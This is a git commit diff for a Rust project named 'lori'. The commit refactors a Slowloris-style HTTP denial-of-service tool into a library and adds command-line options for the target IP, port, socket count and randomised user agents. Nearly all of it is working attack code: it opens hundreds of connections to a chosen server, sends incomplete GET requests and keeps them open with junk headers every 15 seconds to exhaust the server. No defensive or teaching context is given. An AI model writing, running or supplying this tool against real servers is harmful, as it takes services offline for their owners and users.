35221115d962817598b411c372f2e2ffab3e7229
Avery Wagar <ajmw.subs@gmail.com>
2019-04-13 00:33:56 -0700

    move to structopt, finish cli support

---
+++ src/lib.rs
@@ -0,0 +1,190 @@
+extern crate pretty_env_logger;
+#[macro_use] extern crate log;
+
+use std::env;
+use std::error::Error;
+use rayon::prelude::*;
+use openssl::ssl::{SslStream, SslMethod, SslConnector};
+use std::net::{Ipv4Addr, SocketAddr, TcpStream};
+use std::{thread, time};
+use std::io::{Read, Write};
+use rand::prelude::*;
+
+/// List of random user agents
+pub const USER_AGENTS: &[&'static str]  = &[
+    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
+    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
+    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+    &"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
+    &"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    &"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    &"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    &"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    &"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    &"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    &"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    &"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    &"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    &"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    &"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+    &"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+    &"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    &"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    &"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    ];
+
+/// Config of the DOS attack
+pub struct Config {
+    /// https toggle
+    pub https: bool,
+    /// Target Address
+    pub addr: String,
+    /// Port to attack
+    pub port: u16,
+    /// Use random User agents or not
+    pub rand_ua: bool,
+    pub socket_count: usize,
+}
+
+pub struct Lori<T> {
+    /// Config of this lori instance
+    config: Config,
+    /// Vector of connections
+    connections: Vec<T>,
+}
+
+impl Lori<TcpStream> {
+    /// Create a new lori instance
+    pub fn new(config: Config) -> Self {
+        // Create the lori
+        Lori {
+            connections: Vec::with_capacity(config.socket_count),
+            config,
+        }
+    }
+
+    /// Creates the inital sockets of the attack
+    pub fn create_sockets(&mut self) -> Result<(), Box<dyn Error>> {
+        info!("Creating Initial Sockets");
+        // Create inital scokets
+        for i in 0..self.config.socket_count {
+            debug!("Creating Socket #{}", i);
+
+            // Create socket
+            let sock = init_socket(&self.config)?;
+
+            // Add to list
+            self.connections.push(sock);
+        }
+
+        Ok(())
+
+    }
+
+    pub fn attack(&mut self) -> Result<(), Box<dyn Error>> {
+        info!("Starting DOS attack on {:?}", self.config.addr);
+
+        let mut rng = rand::thread_rng();
+
+        loop {
+            info!("Sending keep-alive headers... Socket Count: {}", self.connections.len());
+
+            let max = self.connections.len() - 1;
+
+            for i in 0..max{
+                // prevent out of bounds error
+                if i >= self.connections.len() {
+                    break;
+                }
+
+                // Get socket reference
+                let mut s = self.connections.get(i).unwrap();
+
+                // Generate number again
+                let y: u16 = rng.gen();
+
+                // Write to stream
+                let result = s.write_all(format!("X-a: {}\r\n", y).as_bytes());
+                let result = s.write_all(" ".as_bytes());
+
+                // Remove if socket fails
+                if result.is_err(){
+                    warn!("Socket Error, removing...");
+                    self.connections.remove(i);
+                }
+
+            }
+
+            trace!("Sockets: {}", self.connections.len());
+
+            for _ in 0..(self.config.socket_count - self.connections.len()) {
+                debug!("Recreating Socket...");
+                let sock = init_socket(&self.config)?;
+
+                self.connections.push(sock);
+            }
+
+
+            let delay = time::Duration::from_secs(15);
+
+            thread::sleep(delay);
+
+        }
+
+        Ok(())
+    }
+}
+
+fn init_socket(config: &Config) -> Result<TcpStream, Box<dyn Error>>{
+    // Create stream as normal
+    let mut stream: TcpStream = TcpStream::connect((&config.addr[..], config.port))?;
+
+    let mut rng = rand::thread_rng();
+
+    // if stream.is_ok(){
+    //     log("Connected to target!", 2);
+    // } else {
+    //     log("Couldn't connect to target...", 1);
+    // };
+
+    // stream = stream.unwrap();
+
+    // Use https
+    // if config.https {
+    //     // Create SSL Connector
+    //     let mut connector = SslConnector::builder(SslMethod::tls()).unwrap().build();
+
+
+    //     stream = Stream::Ssl(connector.connect("google.com", stream)?);
+    // }
+
+    let ua: &'static str;
+
+    if config.rand_ua {
+        ua = rng.choose(USER_AGENTS).unwrap();
+    }
+    else {
+        ua = USER_AGENTS[0];
+    }
+
+    let mut rng = rand::thread_rng();
+
+    let y: u16 = rng.gen();
+
+    let headers = format!("GET /?{} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5", y, ua);
+    // let headers = format!("GET /?{} HTTP/1.1\r\n", y);
+
+    trace!("Headers:\n{}", headers);
+
+    // Send HTTP(S) request
+    stream.write_all(headers.as_bytes())?;
+
+
+    Ok(stream)
+}
--- src/main.rs
+++ src/main.rs
@@ -1,58 +1,52 @@
 extern crate pretty_env_logger;
 #[macro_use] extern crate log;
+#[macro_use] extern crate structopt;
+
+use std::path::PathBuf;
+use structopt::StructOpt;
 
 use std::env;
-use rayon::prelude::*;
 use std::error::Error;
-use openssl::ssl::{SslStream, SslMethod, SslConnector};
-use std::{thread, time};
-use std::io::{Read, Write};
 use std::net::{Ipv4Addr, SocketAddr, TcpStream};
-use rand::prelude::*;
 
 // /// Verbosity level
 // static LOG_LEVEL: u8 = 0;
+use lori::*;
 
-const USER_AGENTS: &[&'static str]  = &[
-    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
-    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
-    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-    &"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
-    &"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    &"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    &"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    &"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    &"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-    &"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    &"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    &"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    &"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    &"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-    &"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-    &"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
-    &"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    &"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    &"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
-    ];
 
-/// Config of the DOS attack
-struct Config {
-    /// https toggle
-    https: bool,
-    /// Target Address
-    addr: SocketAddr,
-    /// Use random User agents or not
+/// A basic example
+#[derive(StructOpt, Debug)]
+#[structopt(name = "basic")]
+struct Opt {
+    // A flag, true if used in the command line. Note doc comment will
+    // be used for the help message of the flag.
+    /// Activate ssl mode
+    #[structopt(long = "ssl")]
+    ssl: bool,
+
+    /// Use a random user-agent 
+    #[structopt(short = "r", long = "rand-user-agent")]
     rand_ua: bool,
-    socket_count: usize,
+
+    /// Set number of sockets
+    #[structopt(short = "s", long = "sockets", default_value = "150")]
+    sockets: usize,
+
+    /// Set port to attack
+    #[structopt(short = "p", long = "port", default_value = "80")]
+    port: u16,
+
+    /// Files to process
+    #[structopt(name = "IP")]
+    ip: String,
 }
 
+
 fn main() -> Result<(), Box<dyn Error>> {
+
+
+    let opt = Opt::from_args();
+
     //Set the `RUST_LOG` var if none is provided
     if env::var("RUST_LOG").is_err() {
         env::set_var("RUST_LOG", "lori=INFO");
@@ -60,130 +54,39 @@ fn main() -> Result<(), Box<dyn Error>> {
 
     pretty_env_logger::init_timed();
 
-    // TODO Create config from CLI arguments using Clap
-    let config = Config {
-        https: true,
-        addr: SocketAddr::from((Ipv4Addr::new(0,0,0,0), 8000)),
-        rand_ua: true,
-        socket_count: 200
-    };
 
-    // Pre-Allocate socket_list
-    let mut sock_list: Vec<TcpStream>  = Vec::with_capacity(config.socket_count);
+    // Calling .unwrap() is safe here because "INPUT" is required (if "INPUT" wasn't
+    // required we could have used an 'if let' to conditionally get the value)
+    // println!("Using input file: {}", matches.value_of("INPUT").unwrap());
 
-    let mut rng = rand::thread_rng();
-
-    info!("Creating Initial Sockets");
-
-    // Create inital scokets
-    for i in 0..config.socket_count {
-        debug!("Creating Socket #{}", i);
-
-        // Create socket
-        let sock = init_socket(&config)?;
-
-        // Add to list
-        sock_list.push(sock);
-    }
-
-
-    // Start dos
-    info!("Starting DOS attack on {:?}", config.addr);
-    loop {
-       info!("Sending keep-alive headers... Socket Count: {}", sock_list.len());
-
-
-        let max = sock_list.len() - 1;
-
-        for i in 0..max{
-            // prevent out of bounds error
-            if i >= sock_list.len() {
-                break;
-            }
-
-            // Get socket reference
-            let mut s = sock_list.get(i).unwrap();
-
-            // Generate number again
-            let y: u16 = rng.gen();
-
-            // Write to stream
-            let result = s.write_all(format!("X-a: {}\r\n", y).as_bytes());
-            let result = s.write_all(" ".as_bytes());
-
-            // Remove if socket fails
-            if result.is_err(){
-                warn!("Socket Error, removing...");
-                sock_list.remove(i);
-            }
-
-        }
-
-        trace!("Sockets: {}", sock_list.len());
-
-        for _ in 0..(config.socket_count - sock_list.len()) {
-            debug!("Recreating Socket...");
-            let sock = init_socket(&config)?;
-
-            sock_list.push(sock);
-        }
-        
-
-        let delay = time::Duration::from_secs(15);
-
-        thread::sleep(delay);
-
-    }
-
-    Ok(())
-}
-
-fn init_socket(config: &Config) -> Result<TcpStream, Box<dyn Error>>{
-    // Create stream as normal
-    let mut stream: TcpStream = TcpStream::connect(&config.addr)?;
-
-    let mut rng = rand::thread_rng();
-
-    // if stream.is_ok(){
-    //     log("Connected to target!", 2);
-    // } else {
-    //     log("Couldn't connect to target...", 1);
-    // };
-
-    // stream = stream.unwrap();
-
-    // Use https
-    // if config.https {
-    //     // Create SSL Connector
-    //     let mut connector = SslConnector::builder(SslMethod::tls()).unwrap().build();
-
-
-    //     stream = Stream::Ssl(connector.connect("google.com", stream)?);
+    // Vary the output based on how many times the user used the "verbose" flag
+    // (i.e. 'myprog -v -v -v' or 'myprog -vvv' vs 'myprog -v'
+    // match matches.occurrences_of("v") {
+    //     0 => println!("No verbose info"),
+    //     1 => println!("Some verbose info"),
+    //     2 => println!("Tons of verbose info"),
+    //     3 | _ => println!("Don't be crazy"),
     // }
 
-    let ua: &'static str;
+    // TODO Create config from CLI arguments using Clap
+    let config = Config {
+        https: opt.ssl,
+        addr: opt.ip,
+        port: opt.port,
+        rand_ua: opt.rand_ua,
+        socket_count: opt.sockets,
+    };
 
-    if config.rand_ua {
-        ua = rng.choose(USER_AGENTS).unwrap();
-    }
-    else {
-        ua = USER_AGENTS[0];
-    }
-
-    let mut rng = rand::thread_rng();
-
-    let y: u16 = rng.gen();
-
-    let headers = format!("GET /?{} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5", y, ua);
-    // let headers = format!("GET /?{} HTTP/1.1\r\n", y);
-
-    trace!("Headers:\n{}", headers);
-
-    // Send HTTP(S) request
-    stream.write_all(headers.as_bytes())?;
+    let mut lori = Lori::new(config);
 
 
-    Ok(stream)
+    // Create initial sockets
+    lori.create_sockets()?;
+
+    // Start dos
+    lori.attack()?;
+
+    Ok(())
 }
 
 
